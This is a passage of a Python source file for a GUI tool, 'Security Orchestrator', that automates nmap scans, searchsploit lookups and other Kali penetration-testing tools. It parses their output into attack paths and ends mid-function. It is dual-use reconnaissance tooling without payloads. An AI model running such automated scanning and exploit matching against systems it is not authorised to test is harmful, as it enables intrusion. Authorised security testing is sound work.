#!/usr/bin/env python3
"""
Security Orchestrator - Cross-Platform GUI for Nmap, Searchsploit, Wapiti, enum4linux, and Metasploit
A comprehensive reconnaissance and vulnerability analysis tool.

This is a single-file implementation combining all components for easy deployment on Kali Linux.
"""

import os
import sys
import platform
import subprocess
import shlex
import xml.etree.ElementTree as ET
import re
import threading
import queue
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Callable, Iterable
import traceback
import logging
import logging.handlers
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import json
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak, Image, Preformatted
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY


# Import automated SQLMap scanner
from automated_sqlmap_capture import IntegratedSQLMapScanner

# Import pentest automation integration (bitvijays/Pentest-Scripts inspired)
from pentest_automation_integration import AutomatedEnumerator, ExternalEnumerator

# =============================================================================
# CONFIGURATION AND UTILITIES
# =============================================================================

class Config:
    """Cross-platform configuration manager."""

    def __init__(self):
        self.os_name = platform.system().lower()
        self.is_windows = self.os_name == 'windows'
        self.is_linux = self.os_name == 'linux'

        # Default configuration
        self.config = {
            'app': {
                'name': 'Security Orchestrator',
                'version': '1.0.0',
                'window_width': 1200,
                'window_height': 800,
                'window_title': 'Security Orchestrator - Nmap, Searchsploit, Wapiti, Enum4linux & Metasploit'
            },
            'paths': {
                'results_dir': 'Desktop',
                'log_file': 'scan.log',
                'temp_dir': 'temp'
            },
            'tools': {
                'nmap': {
                    'executable': self._get_tool_executable('nmap'),
                    'timeout': 300,
                    'default_args': ['-v']
                },
                'searchsploit': {
                    'executable': self._get_tool_executable('searchsploit'),
                    'timeout': 60,
                    'default_args': []
                },
                'enum4linux': {
                    'executable': self._get_tool_executable('enum4linux'),
                    'timeout': 300,
                    'default_args': ['-a']
                },
                'wapiti': {
                    'executable': self._get_tool_executable('wapiti'),
                    'timeout': 1200,  # 20 minutes
                    'default_args': []
                },
                'msfconsole': {
                    'executable': self._get_tool_executable('msfconsole'),
                    'timeout': 300,
                    'default_args': []
                },
                'hydra': {
                    'executable': self._get_tool_executable('hydra'),
                    'timeout': 600,
                    'default_args': []
                },
                'sqlmap': {
                    'executable': self._get_tool_executable('sqlmap'),
                    'timeout': 900,
                    'default_args': []
                },
                'gobuster': {
                    'executable': self._get_tool_executable('gobuster'),
                    'timeout': 600,
                    'default_args': []
                },
                'nuclei': {
                    'executable': '/usr/local/bin/nuclei',
                    'timeout': 1800,
                    'default_args': []
                }
            },
            'scanning': {
                'max_concurrent_tools': 3,
                'retry_attempts': 2,
                'default_http_ports': [80, 443, 8080, 8443, 8000, 8008, 8888, 9000],
                'http_services': ['http', 'https', 'http-proxy', 'https-proxy', 'ssl/http', 'http-alt']
            },
            'reporting': {
                'format': 'markdown',
                'include_raw_output': True,
                'max_output_length': 10000,
                'timestamp_format': '%Y-%m-%d %H:%M:%S'
            }
        }

    def _get_tool_executable(self, tool_name: str) -> str:
        """Get the platform-specific executable name for a tool."""
        if self.is_windows:
            for ext in ['.exe', '.bat', '.cmd', '']:
                executable = f"{tool_name}{ext}"
                if self._check_tool_availability(executable):
                    return executable
            return f"{tool_name}.exe"
        else:
            # For Linux/Kali, try multiple possible names and locations
            return self._get_linux_tool_executable(tool_name)

    def _get_linux_tool_executable(self, tool_name: str) -> str:
        """Get tool executable for Linux systems with fallback options."""
        # Define alternative names for tools
        tool_alternatives = {
            'searchsploit': ['searchsploit'],
            'enum4linux': ['enum4linux', 'enum4linux-ng'],
            'w3af_console': ['w3af_console', 'w3af'],
            'nmap': ['nmap'],
            'nikto': ['nikto']
        }

        alternatives = tool_alternatives.get(tool_name, [tool_name])

        # Common installation paths on Kali Linux
        search_paths = [
            '/usr/bin',
            '/usr/local/bin',
            '/usr/sbin',
            '/sbin',
            '/opt',
            '/usr/share',
            '/usr/local/share'
        ]

        # First try PATH
        for alt_name in alternatives:
            if self._check_tool_availability(alt_name):
                return alt_name

        # Then try common installation directories
        for path in search_paths:
            for alt_name in alternatives:
                full_path = Path(path) / alt_name
                if full_path.exists() and full_path.is_file():
                    # Check if executable
                    try:
                        import stat
                        if full_path.stat().st_mode & stat.S_IXUSR:
                            return str(full_path)
                    except:
                        pass

        # Return the primary name as fallback
        return alternatives[0]

    def _check_tool_availability(self, executable: str) -> bool:
        """Check if a tool executable is available in PATH or by full path."""
        import shutil

        # First check if it's a full path
        if Path(executable).exists():
            return True

        # Then check PATH
        return shutil.which(executable) is not None

    def get(self, key_path: str, default: Any = None) -> Any:
        """Get configuration value using dot notation."""
        keys = key_path.split('.')
        value = self.config

        for key in keys:
            if isinstance(value, dict) and key in value:
                value = value[key]
            else:
                return default

        return value

    def set(self, key_path: str, value: Any) -> None:
        """Set configuration value using dot notation."""
        keys = key_path.split('.')
        config_ref = self.config

        for key in keys[:-1]:
            if key not in config_ref:
                config_ref[key] = {}
            config_ref = config_ref[key]

        config_ref[keys[-1]] = value

    def get_results_dir(self, base_dir: Optional[str] = None) -> Path:
        """Get the results directory path."""
        if base_dir:
            results_path = Path(base_dir) / self.get('paths.results_dir')
        else:
            # Use absolute path - try to get user's home directory first
            # or fallback to /tmp if running as root
            import os
            if 'SUDO_USER' in os.environ:
                # Running with sudo, use the actual user's home
                user_home = Path(f"/home/{os.environ['SUDO_USER']}")
            elif os.getenv('USER') == 'root':
                # Running as root without sudo, use /tmp
                user_home = Path('/tmp')
            else:
                # Normal user, use home directory
                user_home = Path.home()

            results_path = user_home / self.get('paths.results_dir')

        results_path.mkdir(parents=True, exist_ok=True)
        # Ensure proper permissions if created as root
        try:
            import stat
            results_path.chmod(stat.S_IRWXU | stat.S_IRWXG | stat.S_IROTH | stat.S_IXOTH)  # 775
        except:
            pass
        return results_path

    def get_log_file_path(self, results_dir: Optional[Path] = None) -> Path:
        """Get the log file path."""
        if not results_dir:
            results_dir = self.get_results_dir()

        return results_dir / self.get('paths.log_file')

    def is_tool_available(self, tool_name: str) -> bool:
        """Check if a security tool is available on the system."""
        executable = self.get(f'tools.{tool_name}.executable')
        if not executable:
            return False

        return self._check_tool_availability(executable)

    def get_available_tools(self) -> list:
        """Get list of available security tools."""
        available = []
        for tool_name in self.config['tools'].keys():
            if self.is_tool_available(tool_name):
                available.append(tool_name)

        return available

    def get_tool_command(self, tool_name: str, additional_args: Optional[list] = None) -> list:
        """Get full command array for a tool."""
        executable = self.get(f'tools.{tool_name}.executable')
        default_args = self.get(f'tools.{tool_name}.default_args', [])

        if not executable:
            raise ValueError(f"Tool {tool_name} not configured")

        command = [executable] + default_args

        if additional_args:
            command.extend(additional_args)

        return command

# Global configuration instance
config = Config()

class SecurityOrchestratorLogger:
    """Enhanced logger with cross-platform support and structured output."""

    def __init__(self,
                 name: str = "SecurityOrchestrator",
                 log_file: Optional[str] = None,
                 console_level: int = logging.INFO,
                 file_level: int = logging.DEBUG):
        self.name = name
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)

        if self.logger.handlers:
            self.logger.handlers.clear()

        if not log_file:
            results_dir = config.get_results_dir()
            log_file = str(config.get_log_file_path(results_dir))

        self.log_file = Path(log_file)
        self.log_file.parent.mkdir(parents=True, exist_ok=True)

        detailed_formatter = logging.Formatter(
            '%(asctime)s | %(name)s | %(levelname)-8s | %(funcName)s:%(lineno)d | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

        simple_formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%H:%M:%S'
        )

        try:
            file_handler = logging.handlers.RotatingFileHandler(
                self.log_file,
                maxBytes=10 * 1024 * 1024,
                backupCount=5,
                encoding='utf-8'
            )
            file_handler.setLevel(file_level)
            file_handler.setFormatter(detailed_formatter)
            self.logger.addHandler(file_handler)
        except Exception as e:
            print(f"Warning: Could not setup file logging: {e}")

        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(console_level)
        console_handler.setFormatter(simple_formatter)
        self.logger.addHandler(console_handler)

        self.scan_start_time = None
        self.current_step = None

    def start_scan_session(self, target: str, nmap_command: str):
        """Mark the start of a new scan session."""
        self.scan_start_time = datetime.now()
        self.info("=" * 80)
        self.info("SCAN SESSION STARTED")
        self.info(f"Target: {target}")
        self.info(f"Nmap Command: {nmap_command}")
        self.info(f"Start Time: {self.scan_start_time}")
        self.info("=" * 80)

    def end_scan_session(self):
        """Mark the end of a scan session."""
        if self.scan_start_time:
            duration = datetime.now() - self.scan_start_time
            self.info("=" * 80)
            self.info("SCAN SESSION COMPLETED")
            self.info(f"Duration: {duration}")
            self.info("=" * 80)

    def start_tool_step(self, tool_name: str, description: str = ""):
        """Log the start of a tool execution step."""
        self.current_step = tool_name
        self.info(f"🚀 Starting {tool_name.upper()}" + (f": {description}" if description else ""))

    def end_tool_step(self, tool_name: str, success: bool = True, message: str = ""):
        """Log the end of a tool execution step."""
        status = "✅ SUCCESS" if success else "❌ FAILED"
        self.info(f"{status} {tool_name.upper()}" + (f": {message}" if message else ""))
        if tool_name == self.current_step:
            self.current_step = None

    def log_tool_output(self, tool_name: str, output: str, is_error: bool = False):
        """Log tool output with appropriate formatting."""
        level = self.error if is_error else self.debug
        output_type = "STDERR" if is_error else "STDOUT"

        max_length = 2000
        if len(output) > max_length:
            truncated = output[:max_length] + f"\n... [TRUNCATED - {len(output)} total chars]"
            level(f"{tool_name} {output_type}:\n{truncated}")
        else:
            level(f"{tool_name} {output_type}:\n{output}")

    def log_command_execution(self, command: list, cwd: Optional[str] = None):
        """Log command execution details."""
        cmd_str = ' '.join(f'"{arg}"' if ' ' in arg else arg for arg in command)
        self.debug(f"Executing command: {cmd_str}")
        if cwd:
            self.debug(f"Working directory: {cwd}")

    def log_xml_parsing(self, file_path: str, success: bool, details: str = ""):
        """Log XML parsing operations."""
        if success:
            self.debug(f"Successfully parsed XML: {file_path}" + (f" - {details}" if details else ""))
        else:
            self.error(f"Failed to parse XML: {file_path}" + (f" - {details}" if details else ""))

    def log_tool_availability(self, tool_name: str, available: bool, path: Optional[str] = None):
        """Log tool availability check results."""
        if available:
            self.info(f"✓ {tool_name} is available" + (f" at {path}" if path else ""))
        else:
            self.warning(f"✗ {tool_name} is not available - will skip this tool")

    def debug(self, message: Any):
        self.logger.debug(str(message))

    def info(self, message: Any):
        self.logger.info(str(message))

    def warning(self, message: Any):
        self.logger.warning(str(message))

    def error(self, message: Any):
        self.logger.error(str(message))

    def critical(self, message: Any):
        self.logger.critical(str(message))

    def exception(self, message: Any):
        self.logger.exception(str(message))

# Global logger instance
logger = SecurityOrchestratorLogger()

# =============================================================================
# DATA MODELS
# =============================================================================

class ScanResults:
    """Data model for storing scan results from all tools."""

    def __init__(self):
        self.nmap_results = {}
        self.searchsploit_results = {}
        self.nikto_results = {}
        self.enum4linux_results = {}
        self.w3af_results = {}
        self.wapiti_results = {}
        self.metadata = {
            'scan_start_time': None,
            'scan_end_time': None,
            'target_ip': None,
            'nmap_command': None,
            'tools_used': []
        }

    def set_metadata(self, key: str, value: Any):
        """Set metadata value."""
        self.metadata[key] = value

    def get_metadata(self, key: str, default: Any = None) -> Any:
        """Get metadata value."""
        return self.metadata.get(key, default)

    def add_tool_result(self, tool_name: str, result: Dict[str, Any]):
        """Add results from a specific tool."""
        if tool_name == 'nmap':
            self.nmap_results = result
        elif tool_name == 'searchsploit':
            self.searchsploit_results = result
        elif tool_name == 'nikto':
            self.nikto_results = result
        elif tool_name == 'enum4linux':
            self.enum4linux_results = result
        elif tool_name == 'w3af':
            self.w3af_results = result
        elif tool_name == 'wapiti':
            self.wapiti_results = result

    def get_tool_result(self, tool_name: str) -> Dict[str, Any]:
        """Get results from a specific tool."""
        if tool_name == 'nmap':
            return self.nmap_results
        elif tool_name == 'searchsploit':
            return self.searchsploit_results
        elif tool_name == 'nikto':
            return self.nikto_results
        elif tool_name == 'enum4linux':
            return self.enum4linux_results
        elif tool_name == 'w3af':
            return self.w3af_results
        elif tool_name == 'wapiti':
            return self.wapiti_results
        return {}

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            'metadata': self.metadata,
            'nmap_results': self.nmap_results,
            'searchsploit_results': self.searchsploit_results,
            'nikto_results': self.nikto_results,
            'enum4linux_results': self.enum4linux_results,
            'w3af_results': self.w3af_results,
            'wapiti_results': self.wapiti_results
        }

class AttackPath:
    """Data model for representing attack paths and recommendations."""

    def __init__(self):
        self.target_info = {}
        self.vulnerabilities = []
        self.attack_vectors = []
        self.recommendations = []
        self.risk_assessment = {}

    def add_vulnerability(self, vuln: Dict[str, Any]):
        """Add a vulnerability to the attack path."""
        self.vulnerabilities.append(vuln)

    def add_attack_vector(self, vector: Dict[str, Any]):
        """Add an attack vector."""
        self.attack_vectors.append(vector)

    def add_recommendation(self, recommendation: str, priority: str = 'medium'):
        """Add a security recommendation."""
        self.recommendations.append({
            'text': recommendation,
            'priority': priority,
            'timestamp': datetime.now().isoformat()
        })

    def set_risk_assessment(self, assessment: Dict[str, Any]):
        """Set overall risk assessment."""
        self.risk_assessment = assessment

    def get_high_priority_vulns(self) -> List[Dict[str, Any]]:
        """Get high-priority vulnerabilities."""
        return [v for v in self.vulnerabilities if v.get('severity', '').lower() in ['high', 'critical']]

    def get_attack_surface(self) -> Dict[str, Any]:
        """Get attack surface summary."""
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'high_severity': len(self.get_high_priority_vulns()),
            'attack_vectors': len(self.attack_vectors),
            'services_exposed': len(set(v.get('service', '') for v in self.vulnerabilities if v.get('service')))
        }

# =============================================================================
# TOOL WRAPPERS
# =============================================================================

class NmapWrapper:
    """Nmap scanner wrapper with XML output parsing."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.xml_output_file = self.results_dir / f"nmap_result_{getattr(self, "target_ip", "unknown")}.xml"
        self.timeout = config.get('tools.nmap.timeout', 300)

    def check_availability(self) -> bool:
        """Check if nmap is available on the system."""
        try:
            executable = config.get('tools.nmap.executable')
            result = subprocess.run([executable, '--version'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('nmap', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('nmap', False)
            logger.debug(f"Nmap availability check failed: {e}")
            return False

    def parse_nmap_command(self, nmap_command: str, target_ip: Optional[str] = None) -> List[str]:
        """Parse and modify nmap command to ensure XML output."""
        try:
            if config.is_windows:
                parts = []
                current = ""
                in_quotes = False

                for char in nmap_command:
                    if char == '"':
                        in_quotes = not in_quotes
                    elif char == ' ' and not in_quotes:
                        if current:
                            parts.append(current)
                            current = ""
                    else:
                        current += char

                if current:
                    parts.append(current)
            else:
                parts = shlex.split(nmap_command)

            if parts and parts[0].lower().endswith('nmap'):
                parts = parts[1:]

            xml_args = ['-oX', str(self.xml_output_file)]

            filtered_parts = []
            skip_next = False

            for i, part in enumerate(parts):
                if skip_next:
                    skip_next = False
                    continue

                if part == '-oX':
                    skip_next = True
                    continue
                elif part.startswith('-oX'):
                    continue
                else:
                    filtered_parts.append(part)

            has_target = any(self._looks_like_target(part) for part in filtered_parts)

            if not has_target and target_ip:
                filtered_parts.append(target_ip)
                logger.info(f"Added fallback target: {target_ip}")

            executable = config.get('tools.nmap.executable')
            final_command = [executable] + filtered_parts + xml_args

            logger.debug(f"Parsed nmap command: {' '.join(final_command)}")
            return final_command

        except Exception as e:
            logger.error(f"Error parsing nmap command: {e}")
            raise ValueError(f"Invalid nmap command: {e}")

    def _looks_like_target(self, arg: str) -> bool:
        """Check if an argument looks like an IP address or hostname."""
        patterns = [
            r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',
            r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$',
            r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}$',
            r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
        ]

        return any(re.match(pattern, arg) for pattern in patterns)

    def run_scan(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute nmap scan with XML output."""
        try:
            logger.start_tool_step('nmap', f'Executing: {nmap_command}')

            command = self.parse_nmap_command(nmap_command, target_ip)

            # Ensure results directory exists with proper permissions
            self.results_dir.mkdir(parents=True, exist_ok=True)
            try:
                import stat
                self.results_dir.chmod(stat.S_IRWXU | stat.S_IRWXG | stat.S_IROTH | stat.S_IXOTH)
            except:
                pass

            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            if stdout.strip():
                logger.log_tool_output('nmap', stdout, False)
            if stderr.strip():
                logger.log_tool_output('nmap', stderr, True)

            if process.returncode == 0 and self.xml_output_file.exists():
                # Fix file permissions if created by sudo
                try:
                    import os
                    if os.geteuid() == 0 and 'SUDO_USER' in os.environ:
                        # Change ownership back to the real user
                        import pwd
                        real_user = os.environ['SUDO_USER']
                        uid = pwd.getpwnam(real_user).pw_uid
                        gid = pwd.getpwnam(real_user).pw_gid
                        os.chown(self.xml_output_file, uid, gid)
                except:
                    pass

                logger.end_tool_step('nmap', True, f"XML output saved to {self.xml_output_file}")
                return True, f"Nmap scan completed successfully. XML output: {self.xml_output_file}"
            else:
                error_msg = f"Nmap failed (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                logger.end_tool_step('nmap', False, error_msg)
                return False, error_msg

        except subprocess.TimeoutExpired:
            error_msg = f"Nmap scan timed out after {self.timeout} seconds"
            logger.end_tool_step('nmap', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"Nmap execution error: {str(e)}"
            logger.end_tool_step('nmap', False, error_msg)
            return False, error_msg

    def parse_xml_results(self) -> Optional[Dict[str, Any]]:
        """Parse nmap XML output and extract key information."""
        if not self.xml_output_file.exists():
            logger.error(f"Nmap XML file not found: {self.xml_output_file}")
            return None

        try:
            logger.debug(f"Parsing nmap XML: {self.xml_output_file}")
            tree = ET.parse(self.xml_output_file)
            root = tree.getroot()

            results = {
                'scan_info': {},
                'hosts': [],
                'summary': {}
            }

            scaninfo = root.find('scaninfo')
            if scaninfo is not None:
                results['scan_info'] = {
                    'type': scaninfo.get('type', ''),
                    'protocol': scaninfo.get('protocol', ''),
                    'numservices': scaninfo.get('numservices', ''),
                    'services': scaninfo.get('services', '')
                }

            for host in root.findall('host'):
                host_info = self._parse_host(host)
                if host_info:
                    results['hosts'].append(host_info)

            runstats = root.find('runstats')
            if runstats is not None:
                finished = runstats.find('finished')
                if finished is not None:
                    results['summary'] = {
                        'elapsed': finished.get('elapsed', ''),
                        'exit': finished.get('exit', ''),
                        'summary': finished.get('summary', '')
                    }

            logger.log_xml_parsing(str(self.xml_output_file), True, f"Found {len(results['hosts'])} hosts")
            return results

        except Exception as e:
            logger.log_xml_parsing(str(self.xml_output_file), False, str(e))
            return None

    def _parse_host(self, host_element) -> Optional[Dict[str, Any]]:
        """Parse individual host element from XML."""
        try:
            host_info = {
                'addresses': [],
                'hostnames': [],
                'ports': [],
                'os': {},
                'status': {}
            }

            for address in host_element.findall('address'):
                host_info['addresses'].append({
                    'addr': address.get('addr', ''),
                    'addrtype': address.get('addrtype', '')
                })

            hostnames_elem = host_element.find('hostnames')
            if hostnames_elem is not None:
                for hostname in hostnames_elem.findall('hostname'):
                    host_info['hostnames'].append({
                        'name': hostname.get('name', ''),
                        'type': hostname.get('type', '')
                    })

            status = host_element.find('status')
            if status is not None:
                host_info['status'] = {
                    'state': status.get('state', ''),
                    'reason': status.get('reason', '')
                }

            ports = host_element.find('ports')
            if ports is not None:
                for port in ports.findall('port'):
                    port_info = self._parse_port(port)
                    if port_info:
                        host_info['ports'].append(port_info)

            os_elem = host_element.find('os')
            if os_elem is not None:
                host_info['os'] = self._parse_os(os_elem)

            return host_info

        except Exception as e:
            logger.debug(f"Error parsing host element: {e}")
            return None

    def _parse_port(self, port_element) -> Optional[Dict[str, Any]]:
        """Parse individual port element from XML."""
        try:
            port_info = {
                'portid': port_element.get('portid', ''),
                'protocol': port_element.get('protocol', ''),
                'state': {},
                'service': {}
            }

            state = port_element.find('state')
            if state is not None:
                port_info['state'] = {
                    'state': state.get('state', ''),
                    'reason': state.get('reason', ''),
                    'reason_ttl': state.get('reason_ttl', '')
                }

            service = port_element.find('service')
            if service is not None:
                port_info['service'] = {
                    'name': service.get('name', ''),
                    'product': service.get('product', ''),
                    'version': service.get('version', ''),
                    'extrainfo': service.get('extrainfo', ''),
                    'method': service.get('method', ''),
                    'conf': service.get('conf', '')
                }

            return port_info

        except Exception as e:
            logger.debug(f"Error parsing port element: {e}")
            return None

    def _parse_os(self, os_element) -> Dict[str, Any]:
        """Parse OS detection element from XML."""
        os_info = {
            'matches': [],
            'classes': []
        }

        try:
            for osmatch in os_element.findall('osmatch'):
                os_info['matches'].append({
                    'name': osmatch.get('name', ''),
                    'accuracy': osmatch.get('accuracy', ''),
                    'line': osmatch.get('line', '')
                })

            for osclass in os_element.findall('osclass'):
                os_info['classes'].append({
                    'type': osclass.get('type', ''),
                    'vendor': osclass.get('vendor', ''),
                    'osfamily': osclass.get('osfamily', ''),
                    'osgen': osclass.get('osgen', ''),
                    'accuracy': osclass.get('accuracy', '')
                })

        except Exception as e:
            logger.debug(f"Error parsing OS element: {e}")

        return os_info

    def get_target_ip(self) -> Optional[str]:
        """Extract target IP from XML results."""
        results = self.parse_xml_results()
        if results and results['hosts']:
            for address in results['hosts'][0]['addresses']:
                if address['addrtype'] == 'ipv4':
                    return address['addr']
        return None

    def get_http_ports(self) -> List[Dict[str, Any]]:
        """Extract HTTP/HTTPS ports from scan results."""
        http_ports = []
        results = self.parse_xml_results()

        if not results:
            return http_ports

        http_services = config.get('scanning.http_services', [])
        default_http_ports = config.get('scanning.default_http_ports', [])

        for host in results['hosts']:
            target_ip = None
            for addr in host['addresses']:
                if addr['addrtype'] == 'ipv4':
                    target_ip = addr['addr']
                    break

            if not target_ip:
                continue

            for port in host['ports']:
                port_num = int(port['portid'])
                service_name = port['service'].get('name', '').lower()

                is_http = (
                    port_num in default_http_ports or
                    any(http_svc in service_name for http_svc in http_services) or
                    'ssl' in service_name and port_num in [443, 8443]
                )

                if is_http and port['state']['state'] == 'open':
                    is_https = (
                        port_num in [443, 8443] or
                        'https' in service_name or
                        'ssl' in service_name
                    )

                    http_ports.append({
                        'ip': target_ip,
                        'port': port_num,
                        'protocol': 'https' if is_https else 'http',
                        'service': port['service'],
                        'url': f"{'https' if is_https else 'http'}://{target_ip}:{port_num}"
                    })

        logger.debug(f"Found {len(http_ports)} HTTP/HTTPS ports: {[p['url'] for p in http_ports]}")
        return http_ports

class SearchsploitWrapper:
    """Searchsploit wrapper for exploit database searches."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / f"searchsploit_{getattr(self, "target_ip", "unknown")}.txt"
        self.timeout = config.get('tools.searchsploit.timeout', 60)

    def check_availability(self) -> bool:
        """Check if searchsploit is available on the system."""
        try:
            executable = config.get('tools.searchsploit.executable')
            result = subprocess.run([executable, '--help'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            # searchsploit returns exit code 2 for --help, but it's still available
            available = result.returncode in [0, 2] or 'searchsploit' in result.stdout.lower() or 'options' in result.stdout.lower()
            logger.log_tool_availability('searchsploit', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('searchsploit', False)
            logger.debug(f"Searchsploit availability check failed: {e}")
            return False

    def run_nmap_search(self, nmap_xml_file: Path) -> Tuple[bool, str]:
        """Run searchsploit against nmap XML output."""
        try:
            logger.start_tool_step('searchsploit', f'Analyzing nmap XML: {nmap_xml_file}')

            if not nmap_xml_file.exists():
                error_msg = f"Nmap XML file not found: {nmap_xml_file}"
                logger.end_tool_step('searchsploit', False, error_msg)
                return False, error_msg

            executable = config.get('tools.searchsploit.executable')
            command = [executable, '-v', '--nmap', str(nmap_xml_file)]

            self.results_dir.mkdir(parents=True, exist_ok=True)

            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("SEARCHSPLOIT ANALYSIS RESULTS\n")
                f.write("=" * 50 + "\n\n")
                f.write("COMMAND EXECUTED:\n")
                f.write(f"{' '.join(command)}\n\n")
                f.write("STDOUT OUTPUT:\n")
                f.write(stdout)
                if stderr.strip():
                    f.write("\n\nSTDERR OUTPUT:\n")
                    f.write(stderr)

            if stdout.strip():
                logger.log_tool_output('searchsploit', stdout, False)
            if stderr.strip():
                logger.log_tool_output('searchsploit', stderr, True)

            if process.returncode == 0:
                logger.end_tool_step('searchsploit', True, f"Results saved to {self.output_file}")
                return True, stdout
            else:
                error_msg = f"Searchsploit failed (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                logger.end_tool_step('searchsploit', False, error_msg)
                return False, error_msg

        except subprocess.TimeoutExpired:
            error_msg = f"Searchsploit timed out after {self.timeout} seconds"
            logger.end_tool_step('searchsploit', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"Searchsploit execution error: {str(e)}"
            logger.end_tool_step('searchsploit', False, error_msg)
            return False, error_msg

    def parse_results(self, output: Optional[str] = None) -> Dict[str, Any]:
        """Parse searchsploit output and extract exploit information."""
        if output is None:
            if not self.output_file.exists():
                logger.error(f"Searchsploit output file not found: {self.output_file}")
                return {'exploits': [], 'summary': {}, 'vulnerabilities': []}

            try:
                with open(self.output_file, 'r', encoding='utf-8') as f:
                    output = f.read()
            except Exception as e:
                logger.error(f"Error reading searchsploit output: {e}")
                return {'exploits': [], 'summary': {}, 'vulnerabilities': []}

        results = {
            'exploits': [],
            'vulnerabilities': [],
            'summary': {
                'total_found': 0,
                'by_service': {},
                'by_platform': {},
                'by_type': {}
            }
        }

        try:
            lines = output.split('\n')
            current_service = None
            in_exploit_section = False

            for i, line in enumerate(lines):
                original_line = line
                line = line.strip()

                # Skip empty lines
                if not line:
                    continue

                # Detect service being searched (lines starting with [i] /usr/bin/searchsploit)
                if '/usr/bin/searchsploit -t ' in line:
                    # Extract service name from command
                    match = re.search(r'-t\s+(.+?)(?:\s|$)', line)
                    if match:
                        current_service = match.group(1).strip()
                    in_exploit_section = True
                    continue

                # Skip info/warning/error lines
                if line.startswith('[i]') or line.startswith('[-]') or line.startswith('[+]'):
                    continue

                # Skip separator lines
                if '---' in line or '===' in line:
                    continue

                # Skip header lines
                if 'Exploit Title' in line or 'Shellcode Title' in line or 'Path' in line:
                    continue

                # Parse exploit lines (format: "Exploit Title | Path")
                if '|' in line and len(line) > 20:
                    parts = line.split('|')
                    if len(parts) >= 2:
                        title = parts[0].strip()
                        path = parts[1].strip()

                        # Ignore lines that are not proper exploits
                        if not title or not path or title == 'Exploit Title' or '---' in title:
                            continue

                        # Determine platform from path
                        platform = 'unknown'
                        if '/' in path:
                            platform = path.split('/')[0]

                        # Determine type (exploit vs shellcode vs other)
                        exploit_type = 'exploit'
                        if 'shellcode' in current_service or i > 0 and 'Shellcode' in lines[i-1]:
                            exploit_type = 'shellcode'

                        exploit_info = {
                            'id': f"{platform}_{results['summary']['total_found']}",
                            'title': title,
                            'platform': platform,
                            'service': current_service or 'unknown',
                            'type': exploit_type,
                            'path': path,
                            'local_file': self._find_local_file(path),
                            'severity': self._estimate_severity(title)
                        }

                        results['exploits'].append(exploit_info)
                        results['vulnerabilities'].append({
                            'type': 'known_exploit',
                            'title': title,
                            'service': current_service or 'unknown',
                            'platform': platform,
                            'severity': exploit_info['severity'],
                            'source': 'searchsploit',
                            'description': f"Potential {platform.title()} exploit available: {title}",
                            'path': path
                        })

                        results['summary']['total_found'] += 1

                        # Track by service
                        if current_service:
                            if current_service not in results['summary']['by_service']:
                                results['summary']['by_service'][current_service] = 0
                            results['summary']['by_service'][current_service] += 1

                        # Track by platform
                        if platform not in results['summary']['by_platform']:
                            results['summary']['by_platform'][platform] = 0
                        results['summary']['by_platform'][platform] += 1

                        # Track by type
                        if exploit_type not in results['summary']['by_type']:
                            results['summary']['by_type'][exploit_type] = 0
                        results['summary']['by_type'][exploit_type] += 1

            logger.debug(f"Parsed {len(results['exploits'])} exploits from searchsploit output")
            logger.debug(f"Found {len(results['vulnerabilities'])} vulnerabilities")
            return results

        except Exception as e:
            logger.error(f"Error parsing searchsploit results: {e}")
            logger.debug(f"Exception traceback: {traceback.format_exc()}")
            return {'exploits': [], 'vulnerabilities': [], 'summary': {}}


    def _find_local_file(self, path: str) -> Optional[str]:
        """Try to find the local exploit file path."""
        try:
            common_paths = [
                '/usr/share/exploitdb',
                '/opt/exploitdb',
                'C:\\exploitdb',
                str(Path.home() / 'exploitdb')
            ]

            for base_path in common_paths:
                full_path = Path(base_path) / path
                if full_path.exists():
                    return str(full_path)

            return None
        except Exception:
            return None


    def _estimate_severity(self, title: str) -> str:
        """Estimate exploit severity based on title keywords."""
        title_lower = title.lower()

        # Critical keywords
